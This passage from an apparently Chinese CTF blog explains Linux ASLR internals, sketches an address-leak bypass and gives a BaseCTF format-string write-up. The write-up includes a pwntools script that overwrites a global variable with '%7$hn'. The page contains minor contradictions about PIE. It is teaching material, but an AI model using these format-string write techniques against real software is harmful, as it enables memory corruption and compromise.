<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/lde_proc</span><br><span class="line">echo test | sudo tee -a /proc/lde_proc</span><br><span class="line"> </span><br><span class="line">[  440.396298] starting from 0xffffffffc0af6090 ...</span><br><span class="line">[  446.024481] lde_proc_read called file 0xffff9626c2931400, buffer 0x000077aeb6db8000 count 0x40000 off 0x0</span><br><span class="line">[  459.392387] lde_proc_write called legnth 0x5, 0x00007fff783f3090</span><br><span class="line">[  476.345011] exiting from 0xffffffffc0af60f0 ...</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="1-3-randomize-va-space变量的设置"><a href="#1-3-randomize-va-space变量的设置" class="headerlink" title="*1.3 randomize_va_space变量的设置"></a>*1.3 randomize_va_space变量的设置</h3><p><code>proc</code>除了支持访问进程信息外，它还支持在Linux内核运行时对内核参数进行修改，该机制也被叫做<code>sysctl</code></p>
<p><code>proc/sys/kernel/</code>中的虚文件会通过<code>kern_table</code>进行定义，每个模块都会定义一个处理函数贺数据对象，处理函数会负责处理虚文件被读写时进行的操作，而数据对象则是被操作的数值。<code>randomize_va_space</code>指定的处理函数史<code>proc_dointvec</code>，其作用是读取整数值或写入整数值，待处理的数据对象是<code>randomize_va_space</code>，它是一个整型的全局变量</p>
<p>当向<code>proc/sys/kernel/randomize_va_space</code>写入数值时，<code>randomize_va_space</code>变量的数值就会被<code>proc_dointvec</code>函数修改</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> <span class="title">kern_table</span>[] =</span> &#123;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_MMU)</span></span><br><span class="line">    &#123;</span><br><span class="line">        .procname   = <span class="string">&quot;randomize_va_space&quot;</span>,</span><br><span class="line">        .data       = &amp;randomize_va_space,</span><br><span class="line">        .maxlen     = <span class="keyword">sizeof</span>(<span class="type">int</span>),</span><br><span class="line">        .mode       = <span class="number">0644</span>,</span><br><span class="line">        .proc_handler   = proc_dointvec,</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="1-4-内存布局的随机化设置"><a href="#1-4-内存布局的随机化设置" class="headerlink" title="1.4 内存布局的随机化设置"></a>1.4 内存布局的随机化设置</h3><p>当程序启动时，负责加载ELF文件的<code>load_elf_binary</code>函数会根据<code>randomize_va_space</code>变量设置标志位，当标志位完成设置后，才会正式开始BRK、MMAP、堆、栈、动态链接库、vDSO的地址随机化，随机化的主要操作就是根据随机值堆地址进行偏移</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="type">static</span> <span class="type">int</span> <span class="title function_">load_elf_binary</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&gt;&#123;</span><br><span class="line">   ......</span><br><span class="line">   <span class="keyword">if</span> (!(current-&gt;personality &amp; ADDR_NO_RANDOMIZE) &amp;&amp; randomize_va_space)</span><br><span class="line">	current-&gt;flags |= PF_RANDOMIZE;</span><br><span class="line">   setup_new_exec(bprm);</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/* Do this so that we can load the interpreter, if need be.  We will</span></span><br><span class="line"><span class="comment">  change some of these later */</span></span><br><span class="line">&gt;retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),</span><br><span class="line">            executable_stack);</span><br><span class="line">&gt;......</span><br><span class="line">&gt;mm = current-&gt;mm;</span><br><span class="line">&gt;mm-&gt;end_code = end_code;</span><br><span class="line">&gt;mm-&gt;start_code = start_code;</span><br><span class="line">&gt;mm-&gt;start_data = start_data;</span><br><span class="line">&gt;mm-&gt;end_data = end_data;</span><br><span class="line">&gt;mm-&gt;start_stack = bprm-&gt;p;</span><br><span class="line"></span><br><span class="line">&gt;......</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">if</span> (!first_pt_load) &#123;</span><br><span class="line">       elf_flags |= MAP_FIXED;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elf_ex-&gt;e_type == ET_EXEC) &#123;</span><br><span class="line">       elf_flags |= MAP_FIXED_NOREPLACE;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elf_ex-&gt;e_type == ET_DYN) &#123;</span><br><span class="line">       <span class="keyword">if</span> (interpreter) &#123;</span><br><span class="line">           load_bias = ELF_ET_DYN_BASE;</span><br><span class="line">           <span class="keyword">if</span> (current-&gt;flags &amp; PF_RANDOMIZE)</span><br><span class="line">               load_bias += arch_mmap_rnd();</span><br><span class="line">           alignment = maximum_alignment(elf_phdata, elf_ex-&gt;e_phnum);</span><br><span class="line">           <span class="keyword">if</span> (alignment)</span><br><span class="line">               load_bias &amp;= ~(alignment - <span class="number">1</span>);</span><br><span class="line">           elf_flags |= MAP_FIXED_NOREPLACE;</span><br><span class="line">       &#125; <span class="keyword">else</span></span><br><span class="line">           load_bias = <span class="number">0</span>;</span><br><span class="line">&gt;......</span><br><span class="line">&gt;&#125;</span><br><span class="line"></span><br><span class="line">&gt;......</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">if</span> ((current-&gt;flags &amp; PF_RANDOMIZE) &amp;&amp; (randomize_va_space &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * For architectures with ELF randomization, when executing</span></span><br><span class="line"><span class="comment">    * a loader directly (i.e. no interpreter listed in ELF</span></span><br><span class="line"><span class="comment">    * headers), move the brk area out of the mmap region</span></span><br><span class="line"><span class="comment">    * (since it grows up, and may collide early with the stack</span></span><br><span class="line"><span class="comment">    * growing down), and into the unused ELF_ET_DYN_BASE region.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">if</span> (IS_ENABLED(CONFIG_ARCH_HAS_ELF_RANDOMIZE) &amp;&amp; elf_ex-&gt;e_type == ET_DYN &amp;&amp; !interpreter) </span><br><span class="line">   &#123;</span><br><span class="line">       mm-&gt;brk = mm-&gt;start_brk = ELF_ET_DYN_BASE;</span><br><span class="line">   &#125;</span><br><span class="line">   mm-&gt;brk = mm-&gt;start_brk = arch_randomize_brk(mm);</span><br><span class="line">   <span class="meta">#<span class="keyword">ifdef</span> compat_brk_randomized</span></span><br><span class="line">&gt;current-&gt;brk_randomized = <span class="number">1</span>;</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;......</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote>
<p><em>看不懂没事，因为看不懂也能做题</em></p>
<h4 id="1-4-1-mmap随机化"><a href="#1-4-1-mmap随机化" class="headerlink" title="1.4.1 mmap随机化"></a>1.4.1 mmap随机化</h4><p>内核会通过<code>arch_pick_mmap_layout</code>函数对MMAP进行随机化，当检测到标志位开启时，就会提供随机值给MMAP，否则会提供0，MMAP会根据该数值对地址空间进行设置</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup_new_exec</span><span class="params">(<span class="keyword">struct</span> linux_binprm * bprm)</span></span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    arch_pick_mmap_layout(me-&gt;mm, &amp;bprm-&gt;rlim_stack);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(setup_new_exec);</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_rnd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> rndbits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(current-&gt;flags &amp; PF_RANDOMIZE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (get_random_long() &amp; ((<span class="number">1UL</span> &lt;&lt; rndbits) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
<h4 id="1-4-2-栈的随机化"><a href="#1-4-2-栈的随机化" class="headerlink" title="1.4.2 栈的随机化"></a>1.4.2 栈的随机化</h4><p><code>load_elf_binary</code>函数会先通过<code>setup_arg_page</code>函数设置栈空间。栈空间的偏移值由<code>randomize_stack_top</code>的结果决定，当标志位中存在<code>PF_RANDOMIZE</code>时，<code>randomize_stack_top</code>将地址根据随机值进行偏移，否则就不会进行偏移</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">randomize_stack_top</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> stack_top)</span></span><br><span class="line">&gt;&#123;</span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> random_variable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (current-&gt;flags &amp; PF_RANDOMIZE) &#123;</span><br><span class="line">       random_variable = get_random_long();</span><br><span class="line">       random_variable &amp;= STACK_RND_MASK;</span><br><span class="line">       random_variable &lt;&lt;= PAGE_SHIFT;</span><br><span class="line">   &#125;</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">ifdef</span> CONFIG_STACK_GROWSUP</span></span><br><span class="line">   <span class="keyword">return</span> PAGE_ALIGN(stack_top) + random_variable;</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">   <span class="keyword">return</span> PAGE_ALIGN(stack_top) - random_variable;</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&gt;&#125;</span><br><span class="line"></span><br><span class="line">&gt;<span class="type">int</span> <span class="title function_">setup_arg_pages</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm,</span></span><br><span class="line"><span class="params">           <span class="type">unsigned</span> <span class="type">long</span> stack_top,</span></span><br><span class="line"><span class="params">           <span class="type">int</span> executable_stack)</span></span><br><span class="line">&gt;&#123;</span><br><span class="line">   ......</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">ifdef</span> CONFIG_STACK_GROWSUP</span></span><br><span class="line">   <span class="comment">/* Limit stack size */</span></span><br><span class="line">   stack_base = bprm-&gt;rlim_stack.rlim_max;</span><br><span class="line"></span><br><span class="line">   stack_base = calc_max_stack_size(stack_base);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Add space for stack randomization. */</span></span><br><span class="line">   stack_base += (STACK_RND_MASK &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Make sure we didn&#x27;t let the argument array grow too large. */</span></span><br><span class="line">   <span class="keyword">if</span> (vma-&gt;vm_end - vma-&gt;vm_start &gt; stack_base)</span><br><span class="line">       <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">   stack_base = PAGE_ALIGN(stack_top - stack_base);</span><br><span class="line"></span><br><span class="line">   stack_shift = vma-&gt;vm_start - stack_base;</span><br><span class="line">   mm-&gt;arg_start = bprm-&gt;p - stack_shift;</span><br><span class="line">   bprm-&gt;p = vma-&gt;vm_end - stack_shift;</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">   stack_top = arch_align_stack(stack_top);</span><br><span class="line">   stack_top = PAGE_ALIGN(stack_top);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (unlikely(stack_top &lt; mmap_min_addr) ||</span><br><span class="line">       unlikely(vma-&gt;vm_end - vma-&gt;vm_start &gt;= stack_top - mmap_min_addr))</span><br><span class="line">       <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">   stack_shift = vma-&gt;vm_end - stack_top;</span><br><span class="line"></span><br><span class="line">   bprm-&gt;p -= stack_shift;</span><br><span class="line">   mm-&gt;arg_start = bprm-&gt;p;</span><br><span class="line">&gt;<span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   ......</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote>
<p>一般来说，栈是向下增长的，如果支持栈向上增长，那么可以通过<code>CONFIG_STACK_GROWSUP</code>对内核进行配置。处理栈空间的地址时，如果不使用<code>CONFIG_STACK_GROWSUP</code>功能，那么栈顶地址会通过<code>arch_align_stack</code>再次进行偏移，然后将低4比特设置为0，进行对齐。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_align_stack</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> sp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(current-&gt;personality &amp; ADDR_NO_RANDOMIZE) &amp;&amp; randomize_va_space)</span><br><span class="line">        sp -= prandom_u32_max(<span class="number">8192</span>);</span><br><span class="line">    <span class="keyword">return</span> sp &amp; ~<span class="number">0xf</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#### <span class="number">1.4</span>.<span class="number">3</span> 动态链接的随机化</span><br><span class="line"></span><br><span class="line">当`load_elf_binary`函数处理动态链接库时，它会根据标志位决定是否给动态链接库的加载地址设置偏移值，偏移值的数值由`arch_rnd`获取。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_rnd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> rndbits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(current-&gt;flags &amp; PF_RANDOMIZE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (get_random_long() &amp; ((<span class="number">1UL</span> &lt;&lt; rndbits) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_mmap_rnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">load_elf_binary&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> (!first_pt_load) &#123;</span><br><span class="line">        elf_flags |= MAP_FIXED;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elf_ex-&gt;e_type == ET_EXEC) &#123;</span><br><span class="line">        elf_flags |= MAP_FIXED_NOREPLACE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elf_ex-&gt;e_type == ET_DYN) &#123;</span><br><span class="line">        <span class="keyword">if</span> (interpreter) &#123;</span><br><span class="line">            load_bias = ELF_ET_DYN_BASE;</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;flags &amp; PF_RANDOMIZE)</span><br><span class="line">                load_bias += arch_mmap_rnd();</span><br><span class="line">            alignment = maximum_alignment(elf_phdata, elf_ex-&gt;e_phnum);</span><br><span class="line">            <span class="keyword">if</span> (alignment)</span><br><span class="line">                load_bias &amp;= ~(alignment - <span class="number">1</span>);</span><br><span class="line">            elf_flags |= MAP_FIXED_NOREPLACE;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            load_bias = <span class="number">0</span>;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="1-5-随机化总结"><a href="#1-5-随机化总结" class="headerlink" title="1.5 随机化总结"></a>1.5 随机化总结</h3><p>上面已经描述了需要随机化的地址空间（BRK、堆、栈、MMAP、动态链接库、vDSO）是如何及何时进行随机化的，由于随机化的操作是程序运行开始阶段处理的，<strong>所以随机化选项的变更并不会影响已经运行的程序。</strong></p>
<p>尽管不同地址空间的随机化方式都是根据随机值进行偏移，但是也可以明显的看到，不同地址空间随机化取值的方式总体上是类似的，先是通过<code>get_random_long</code>函数获取随机值，然后根据某数值进行运算，最后根据页偏移进行对齐。</p>
<p>下面对为什么使用不同数值计算的原因进行了解释。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT      12</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">get_random_long</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> BITS_PER_LONG == 64</span></span><br><span class="line">    <span class="keyword">return</span> get_random_u64();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> get_random_u32();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
<p>mmap、动态链接库的解释</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rndbits = mmap64_rnd_bit = mmap_rnd_bits = CONFIG_ARCH_MMAP_RND_BITS = <span class="number">32</span></span><br><span class="line"> </span><br><span class="line">(get_random_long() &amp; ((<span class="number">1UL</span> &lt;&lt; rndbits) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT</span><br></pre></td></tr></table></figure>

<p>作用：将随机值跟页大小对齐（4kb，0x1000）；1向右移动32位比特，减1后变为32位比特空间内的最大值，特点是所有比特位全为1，当随机值和它进行与运算后，随机值会被保留下来，最后根据页大小向右移动12位，跟页大小对齐。由于运算时比特位自动扩充的原因，<code>((1UL &lt;&lt; rndbits) -  1)</code>可以保障数值占用的比特位数量在32内，在64位系统中，用户空间一般会占用48位空间，考虑到高4位会被用于区分不同的ELF文件（比如动态链接库一般是0x7xxx打头，执行文件一般0x5xxx、0x6xxx打头等等），所以系统会对低48位（32位随机值+12位页对齐值）进行设置，并不会触及高4个比特位</p>
</blockquote>
<p>栈的解释：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __STACK_RND_MASK(is32bit) ((is32bit) ? 0x7ff : 0x3fffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_RND_MASK __STACK_RND_MASK(mmap_is_ia32())</span></span><br><span class="line"> </span><br><span class="line">random_variable = get_random_long();</span><br><span class="line">random_variable &amp;= STACK_RND_MASK;</span><br><span class="line">random_variable &lt;&lt;= PAGE_SHIFT;</span><br></pre></td></tr></table></figure>

<p>作用：设置随机值后跟页大小对齐（4kb，0x1000）；原数值和0x3fffff与运算时，只有低22个比特位会被保留下来，当跟页大小对齐后，数值大小会被扩充到34个比特位，在Linux当中，栈地址会以0x7ffx打头，占用14个比特位，所以会对低34个比特位设置。</p>
</blockquote>
<h2 id="2-绕过思路"><a href="#2-绕过思路" class="headerlink" title="2 绕过思路"></a>2 绕过思路</h2><p>下面会以程序中存在泄露地址的情况为前提进行讨论。</p>
<p>即使开启了ASLR，导致程序使用的内存地址在不断的变化，但是变化的只是基地址，程序内容的地址仍然靠基地址加文件内偏移的组合进行定位，因此程序同一元素即使每次每次运行时的地址都不一样，<strong>但它减去起始地址的偏移值永远都是固定的。</strong></p>
<p>当我们可以稳定泄露程序内某元素的地址时，就可以先借助起始地址手工计算偏移值，等到下次运行时，就可以直接通过元素的随机地址减偏移值得到随机的起始地址（比如可泄露元素的地址是Libc中，那么就相当于稳定获取Libc的基地址，进而对整个Libc进行利用）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/9th_thformat_string_level1/format_string_level1/format_string_level1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/9th_thformat_string_level1/format_string_level1/format_string_level1/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:38:25" itemprop="dateModified" datetime="2025-02-11T16:38:25+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“string-format-level1”"><a href="#Basectf-pwn方向“string-format-level1”" class="headerlink" title="Basectf pwn方向“string_format_level1”"></a>Basectf pwn方向“string_format_level1”</h1><p>by Maple</p>
<p>依旧，题目就是提示，检查下题目发现关闭了PIE保护，也就是说可以在地址上做文章了</p>
<p><img src="/image.png" alt="alt text"></p>
<p>这里可以发现当target不为0的时候可以输出flag，所以修改flag值就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x4040b0</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa%7$hn&#x27;</span>+p64(target)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>获取输入值在栈中的偏移量的方法就不加赘述了</p>
<p>这里target的地址是直接在ida里找到的，因为开启了pie所以所见即所得</p>
<p><code>printf(&quot;%d %n&quot;,a,&amp;b);</code>的意思是读入数字到a中，而读入的字符数将读入到b指向的内存地址中</p>
<p><code>payload = b&#39;aaa%7$hn&#39;+p64(target)</code></p>
<ul>
<li>先填充位，不然就算改到target里了也是从0变成了0</li>
<li><code>%7$hn</code><ul>
<li><code>7$</code>是第七个参数作为格式化源（也就是printf函数会从堆栈中获取第7个参数的值）</li>
<li><code>hn</code>表示将该参数的值以半字（half n）（2字节）的形式写入到指定内存</li>
</ul>
</li>
<li><code>p64(target)</code>就是相应的内存地址</li>
</ul>
<p>现在的</p>
<p><code>printf(&quot;%s %hn&quot;,aaa,&amp;target)</code></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/8th_format_string_level0/format_string_level0/format_string_level0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

